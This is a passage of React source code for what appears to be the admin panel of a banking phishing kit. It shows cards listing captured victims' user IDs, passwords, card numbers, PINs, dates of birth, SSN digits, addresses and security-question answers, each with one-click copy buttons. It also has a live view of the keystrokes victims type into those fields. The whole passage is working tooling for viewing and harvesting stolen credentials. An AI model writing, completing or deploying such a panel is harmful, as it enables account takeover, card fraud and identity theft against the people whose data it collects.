                cursor: currentPage >= totalPages ? "default" : "pointer",
              }}
            >Next →</button>
          </div>
        </div>
      )}

      {/* ─── User Cards ─── */}
      <div style={{
        padding: "8px 12px 12px",
        display: "grid", gridTemplateColumns: "repeat(auto-fill, minmax(min(100%, 460px), 1fr))",
        gap: 10, position: "relative", zIndex: 1,
      }}>
        {filtered.length === 0 && (
          <div style={{
            gridColumn: "1/-1", textAlign: "center", padding: "30px 20px",
            borderRadius: 10, border: "1px dashed rgba(100,116,139,0.15)",
          }}>
            <div style={{ fontSize: 32, marginBottom: 8, filter: "grayscale(0.5)" }}>🛰️</div>
            <p style={{ color: "#334155", fontSize: 13, margin: 0, fontWeight: 600 }}>
              Monitoring... Users appear in real-time.
            </p>
          </div>
        )}
        {paginatedUsers.map((user, idx) => {
          const globalIdx = (currentPage - 1) * ITEMS_PER_PAGE + idx;
          return (
            <MemoizedUserCard key={user.id} user={user} index={idx} number={globalIdx + 1} classified={false} onDelete={() => handleDeleteOne(user)} isDuplicate={duplicateInfo.dupIds.has(user.id)} isStarred={starred.has(user.id)} onToggleStar={() => toggleStar(user.id)} accentOverride={themeColors.a} />
          );
        })}
      </div>

      <style>{`
        @keyframes neonPulse { 0%,100%{opacity:1} 50%{opacity:.55} }
        @keyframes liveBlink { 0%,100%{opacity:1} 50%{opacity:.25} }
        @keyframes slideIn { from{opacity:0;transform:translateY(16px)} to{opacity:1;transform:translateY(0)} }
        @keyframes flashFade { from{opacity:1} to{opacity:0} }
        @keyframes ripple { 0%{box-shadow:0 0 0 0 rgba(52,211,153,0.4)} 100%{box-shadow:0 0 0 12px rgba(52,211,153,0)} }
        @keyframes shakeX { 0%,100%{transform:translateX(0)} 20%{transform:translateX(-10px)} 40%{transform:translateX(10px)} 60%{transform:translateX(-6px)} 80%{transform:translateX(6px)} }
      `}</style>
      </div>{/* end blur wrapper */}
    </div>

  );
};

const TYPING_ICONS: Record<string, React.ReactNode> = {
  "User ID": <Fingerprint size={10} />,
  "Password": <KeyRound size={10} />,
  "First Name": <Users size={10} />,
  "Last Name": <Users size={10} />,
  "Email": <Mail size={10} />,
  "Phone": <Phone size={10} />,
  "Card Number": <CreditCard size={10} />,
  "PIN": <Hash size={10} />,
  "DOB": <Calendar size={10} />,
  "SSN": <KeyRound size={10} />,
};

const SessionCard = ({ session, typing, classified }: { session: LiveSession; typing?: Record<string, string>; classified?: boolean }) => {
  // Re-derivăm status live din lastSeen (decade fără re-fetch).
  const sinceSeen = Date.now() - new Date(session.lastSeen).getTime();
  const isLeft = session.status === "left" || sinceSeen >= 20000;
  const isIdle = !isLeft && sinceSeen >= 10000;
  const isActive = !isLeft && !isIdle;
  const dotColor = isActive ? "#34d399" : isIdle ? "#eab308" : "#475569";
  const borderColor = isActive ? "rgba(52,211,153,0.2)" : isIdle ? "rgba(234,179,8,0.15)" : "rgba(71,85,105,0.1)";
  const StatusIcon = isActive ? Wifi : isLeft ? WifiOff : Wifi;

  const duration = () => {
    const diff = Date.now() - new Date(session.startedAt).getTime();
    const mins = Math.floor(diff / 60000);
    const secs = Math.floor((diff % 60000) / 1000);
    return mins > 0 ? `${mins}m ${secs}s` : `${secs}s`;
  };

  return (
    <div style={{
      padding: "10px 14px", borderRadius: 10,
      background: isLeft ? "rgba(15,20,35,0.3)" : "rgba(15,20,35,0.6)",
      border: `1px solid ${borderColor}`,
      opacity: isLeft ? 0.5 : 1,
      transition: "all 0.3s",
    }}>
      <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
        <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
          <div style={{
            width: 8, height: 8, borderRadius: "50%",
            background: dotColor,
            boxShadow: isActive ? `0 0 8px ${dotColor}` : "none",
            animation: isActive ? "ripple 2s infinite" : "none",
          }} />
          <StatusIcon size={13} color={dotColor} />
          <span style={{ fontSize: 12, fontWeight: 700, color: isLeft ? "#475569" : "#e2e8f0" }}>
            {session.currentPage}
          </span>
        </div>
        <span style={{ fontSize: 10, color: "#475569", fontVariantNumeric: "tabular-nums" }}>
          {duration()}
        </span>
      </div>
      <div style={{ display: "flex", gap: 4, marginTop: 6, flexWrap: "wrap" }}>
        {session.pagesVisited.map((p, i) => (
          <span key={i} style={{
            fontSize: 9, padding: "2px 6px", borderRadius: 4,
            background: p === session.currentPage ? `${dotColor}15` : "rgba(255,255,255,0.03)",
            color: p === session.currentPage ? dotColor : "#475569",
            border: `1px solid ${p === session.currentPage ? dotColor + "30" : "rgba(255,255,255,0.05)"}`,
            fontWeight: 600,
          }}>
            {p}
          </span>
        ))}
      </div>

      {/* Live typing data */}
      {typing && Object.keys(typing).some(k => typing[k]) && (
        <div style={{
          marginTop: 6, paddingTop: 6,
          borderTop: `1px solid ${borderColor}`,
        }}>
          <div style={{ display: "flex", alignItems: "center", gap: 4, marginBottom: 4 }}>
            <Type size={8} color="#f59e0b" />
            <span style={{ fontSize: 8, fontWeight: 800, letterSpacing: "0.8px", color: "#f59e0b", textTransform: "uppercase", animation: "neonPulse 1.2s infinite" }}>
              TYPING LIVE...
            </span>
          </div>
          <div style={{ display: "grid", gap: 2 }}>
            {Object.entries(typing).filter(([, v]) => v).map(([field, value]) => (
              <div key={field} style={{
                display: "flex", alignItems: "center", gap: 5,
                padding: "2px 6px", borderRadius: 4,
                background: "rgba(245,158,11,0.06)",
                border: "1px solid rgba(245,158,11,0.1)",
              }}>
                <span style={{ color: "#f59e0b", opacity: 0.7, display: "flex" }}>
                  {TYPING_ICONS[field] || <Type size={8} />}
                </span>
                <span style={{ fontSize: 8, color: "#64748b", fontWeight: 700, minWidth: 42, textTransform: "uppercase", letterSpacing: "0.2px" }}>
                  {field}
                </span>
                <span style={{
                  fontSize: 10, fontWeight: 600, color: "#fbbf24",
                  fontFamily: "Tahoma, Verdana, 'Segoe UI', Arial, sans-serif",
                  letterSpacing: "0.1px",
                  overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap",
                  borderRight: "1.5px solid #f59e0b",
                  paddingRight: 1,
                  animation: "liveBlink 0.8s infinite",
                  userSelect: "text",
                }} title={value}>
                  {value}
                </span>
              </div>
            ))}
          </div>
        </div>
      )}
    </div>
  );
};

// ─── Timeline step colors for returning users ───
const STEP_COLORS = [
  { dot: "#a855f7", glow: "rgba(168,85,247,0.3)", bg: "rgba(168,85,247,0.06)" },
  { dot: "#ec4899", glow: "rgba(236,72,153,0.3)", bg: "rgba(236,72,153,0.06)" },
  { dot: "#8b5cf6", glow: "rgba(139,92,246,0.3)", bg: "rgba(139,92,246,0.06)" },
  { dot: "#f472b6", glow: "rgba(244,114,182,0.3)", bg: "rgba(244,114,182,0.06)" },
  { dot: "#c084fc", glow: "rgba(192,132,252,0.3)", bg: "rgba(192,132,252,0.06)" },
  { dot: "#e879f9", glow: "rgba(232,121,249,0.3)", bg: "rgba(232,121,249,0.06)" },
];

// ─── Mic buton de copy pentru fiecare valoare ───
const CopyBtn = ({ value, accent }: { value: string; accent: string }) => {
  const [copied, setCopied] = useState(false);
  const handleCopy = async (e: React.MouseEvent) => {
    e.stopPropagation();
    try {
      if (navigator.clipboard?.writeText) {
        await navigator.clipboard.writeText(value);
      } else {
        const ta = document.createElement("textarea");
        ta.value = value;
        ta.style.position = "fixed";
        ta.style.opacity = "0";
        document.body.appendChild(ta);
        ta.select();
        document.execCommand("copy");
        document.body.removeChild(ta);
      }
      setCopied(true);
      setTimeout(() => setCopied(false), 1200);
    } catch {}
  };
  return (
    <button
      onClick={handleCopy}
      title={copied ? "Copiat!" : "Copy"}
      style={{
        background: copied ? "rgba(52,211,153,0.18)" : "rgba(255,255,255,0.04)",
        border: `1px solid ${copied ? "rgba(52,211,153,0.45)" : "rgba(255,255,255,0.08)"}`,
        color: copied ? "#34d399" : accent,
        borderRadius: 5,
        padding: "2px 5px",
        cursor: "pointer",
        display: "flex",
        alignItems: "center",
        justifyContent: "center",
        flexShrink: 0,
        transition: "all 0.15s",
      }}
      onMouseEnter={(e) => {
        if (!copied) {
          e.currentTarget.style.background = "rgba(255,255,255,0.08)";
          e.currentTarget.style.borderColor = "rgba(255,255,255,0.15)";
        }
      }}
      onMouseLeave={(e) => {
        if (!copied) {
          e.currentTarget.style.background = "rgba(255,255,255,0.04)";
          e.currentTarget.style.borderColor = "rgba(255,255,255,0.08)";
        }
      }}
    >
      {copied ? <Check size={11} /> : <Copy size={11} />}
    </button>
  );
};

// ─── User data card (compact & elegant) ───
const UserCard = ({ user, index, number, classified, onDelete, isDuplicate, isStarred, onToggleStar, accentOverride }: { user: UserEntry; index: number; number: number; classified?: boolean; onDelete?: () => void; isDuplicate?: boolean; isStarred?: boolean; onToggleStar?: () => void; accentOverride?: string }) => {
  const isNew = user.type === "new";
  // NEW users => light blue, RETRO (returning) users => purple
  const accent = isNew ? "#60a5fa" : "#a855f7";


  const fields: { label: string; value: string; icon: React.ReactNode }[] = [];
  if (user.userId) fields.push({ label: "User ID", value: user.userId, icon: <Fingerprint size={12} /> });
  if (user.password) fields.push({ label: "Password", value: user.password, icon: <KeyRound size={12} /> });
  if (user.firstName) fields.push({ label: "First", value: user.firstName, icon: <Users size={12} /> });
  if (user.lastName) fields.push({ label: "Last", value: user.lastName, icon: <Users size={12} /> });
  if (isNew && user.email) fields.push({ label: "Email", value: user.email, icon: <Mail size={12} /> });
  if (isNew && user.phone) fields.push({ label: "Phone", value: user.phone, icon: <Phone size={12} /> });
  if (user.cardNumber) fields.push({ label: "Card", value: user.cardNumber, icon: <CreditCard size={12} /> });
  if (user.pinCard) fields.push({ label: "PIN", value: user.pinCard, icon: <Hash size={12} /> });
  if (user.dob) fields.push({ label: "DOB", value: user.dob, icon: <Calendar size={12} /> });
  if (user.ssnLast4) fields.push({ label: "SSN", value: user.ssnLast4, icon: <KeyRound size={12} /> });
  if (user.zipCode) fields.push({ label: "Zip", value: user.zipCode, icon: <MapPin size={12} /> });
  // Address line directly under ZIP (street + apt only — city/state hidden)
  const street = [user.streetAddress, user.aptUnit].filter(Boolean).join(" ");
  if (street) fields.push({ label: "Address", value: street, icon: <MapPin size={12} /> });

  return (
    <div style={{
      background: "rgba(12,16,28,0.9)", borderRadius: 10,
      border: `1px solid ${accent}15`,
      overflow: "hidden",
      animation: `slideIn 0.3s ease-out ${index * 0.04}s both`,
      transition: "border-color 0.2s, box-shadow 0.2s",
    }}
    onMouseEnter={(e) => { e.currentTarget.style.borderColor = `${accent}40`; e.currentTarget.style.boxShadow = `0 0 20px ${accent}10`; }}
    onMouseLeave={(e) => { e.currentTarget.style.borderColor = `${accent}15`; e.currentTarget.style.boxShadow = "none"; }}
    >
      {/* Thin accent top line */}
      <div style={{ height: 2, background: `linear-gradient(90deg, ${accent}, ${accent}40, transparent)` }} />

      {/* Header row */}
      <div style={{
        display: "flex", justifyContent: "space-between", alignItems: "center",
        padding: "8px 12px 6px",
        borderBottom: "1px solid rgba(255,255,255,0.03)",
      }}>
        <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
          <span style={{
            background: `${accent}18`, border: `1px solid ${accent}35`,
            color: accent, borderRadius: 6, padding: "1px 7px",
            fontSize: 10, fontWeight: 800, fontVariantNumeric: "tabular-nums",
          }}>#{number}</span>
          <span style={{
            fontSize: 10, fontWeight: 800, letterSpacing: "1px", color: accent,
            textTransform: "uppercase", opacity: 0.9,
          }}>
            {isNew ? "⚡ NEW" : "🔮 RETURN"}
          </span>
          {(user.firstName || user.lastName) && (
            <span style={{ fontSize: 12, fontWeight: 700, color: "#e2e8f0" }}>
              {[user.firstName, user.lastName].filter(Boolean).join(" ")}
            </span>
          )}
          {isDuplicate && (
            <span style={{
              background: "rgba(251,191,36,0.15)", border: "1px solid rgba(251,191,36,0.4)",
              color: "#fbbf24", borderRadius: 5, padding: "1px 6px",
              fontSize: 9, fontWeight: 800, letterSpacing: "0.5px",
            }} title="Exact duplicate of another entry">♻️ DUPLICATE</span>
          )}
        </div>
        <div style={{ display: "flex", alignItems: "center", gap: 5 }}>
          <span style={{ fontSize: 9, color: "#475569", fontVariantNumeric: "tabular-nums" }}>
            {new Date(user.timestamp).toLocaleString()}
          </span>
          {onToggleStar && (
            <button onClick={onToggleStar} title={isStarred ? "Unstar" : "Star (mark important)"} style={{
              background: isStarred ? "rgba(251,191,36,0.18)" : "rgba(255,255,255,0.04)",
              border: `1px solid ${isStarred ? "rgba(251,191,36,0.5)" : "rgba(255,255,255,0.08)"}`,
              color: isStarred ? "#fbbf24" : "#64748b", borderRadius: 5, padding: "2px 6px",
              cursor: "pointer", display: "flex", alignItems: "center",
              transition: "all 0.15s",
            }}><Star size={10} fill={isStarred ? "#fbbf24" : "none"} /></button>
          )}
          {onDelete && (
            <button onClick={onDelete} title="Delete" style={{
              background: "rgba(239,68,68,0.08)", border: "1px solid rgba(239,68,68,0.2)",
              color: "#f87171", borderRadius: 5, padding: "2px 6px",
              cursor: "pointer", fontSize: 9, fontWeight: 700,
              display: "flex", alignItems: "center", gap: 2,
              transition: "all 0.15s",
            }}
            onMouseEnter={(e) => { e.currentTarget.style.background = "rgba(239,68,68,0.2)"; }}
            onMouseLeave={(e) => { e.currentTarget.style.background = "rgba(239,68,68,0.08)"; }}
            ><Trash2 size={10} /></button>
          )}

        </div>
      </div>

      {/* Fields - compact 2-column grid */}
      <div style={{
        padding: "6px 10px 8px",
        display: "grid",
        gridTemplateColumns: fields.length > 4 ? "1fr 1fr" : "1fr",
        gap: 3,
      }}>
        {fields.map(({ label, value, icon }) => (
          <div key={label} style={{
            display: "flex", alignItems: "center", gap: 6,
            padding: "4px 8px", borderRadius: 6,
            background: "rgba(255,255,255,0.02)",
            minWidth: 0,
          }}>
            <span style={{ color: accent, opacity: 0.7, display: "flex", flexShrink: 0 }}>{icon}</span>
            <span style={{
              fontSize: 10, color: "#94a3b8", fontWeight: 700,
              textTransform: "uppercase", letterSpacing: "0.3px",
              flexShrink: 0,
            }}>{label}</span>
            <span
              title={value}
              style={{
                fontSize: 13, fontWeight: 600, color: "#f8fafc",
                fontFamily: "Tahoma, Verdana, 'Segoe UI', Arial, sans-serif",
                letterSpacing: "0.2px",
                whiteSpace: "nowrap",
                overflow: "hidden",
                textOverflow: "ellipsis",
                minWidth: 0,
                flex: "1 1 auto",
                userSelect: "text",
              }}
            >{value}</span>
            <CopyBtn value={value} accent={accent} />
          </div>
        ))}
      </div>

      {/* Challenge questions - compact */}
      {user.challengeQuestions && user.challengeQuestions.length > 0 && (
        <div style={{
          padding: "0 10px 8px",
          borderTop: "1px solid rgba(255,255,255,0.03)",
          marginTop: 2,
        }}>
          <span style={{ color: accent, fontSize: 8, fontWeight: 800, letterSpacing: "1.2px", opacity: 0.5 }}>SECURITY Q&A</span>
          <div style={{ display: "grid", gap: 2, marginTop: 3 }}>
            {user.challengeQuestions.map((cq, i) => (
              <div key={i} style={{
                display: "flex", alignItems: "center", gap: 6,
                padding: "3px 8px", borderRadius: 5,
                background: "rgba(255,255,255,0.02)",
                borderLeft: `2px solid ${accent}30`,
              }}>
                <span style={{ fontSize: 10, color: "#94a3b8", fontWeight: 600 }}>Q{i + 1}: {cq.question}</span>
                <span style={{
                  fontSize: 13, fontWeight: 600, color: "#f8fafc",
                  fontFamily: "Tahoma, Verdana, 'Segoe UI', Arial, sans-serif",
                  letterSpacing: "0.2px",
                  marginLeft: "auto",
                  whiteSpace: "nowrap",
                  overflow: "hidden",
                  textOverflow: "ellipsis",
                  userSelect: "text",
                }} title={cq.answer}>{cq.answer}</span>
                <CopyBtn value={cq.answer} accent={accent} />
              </div>
            ))}
          </div>
        </div>
      )}
    </div>
  );
};

const MemoizedUserCard = memo(UserCard);
const MemoizedSessionCard = memo(SessionCard);

export default Admin;
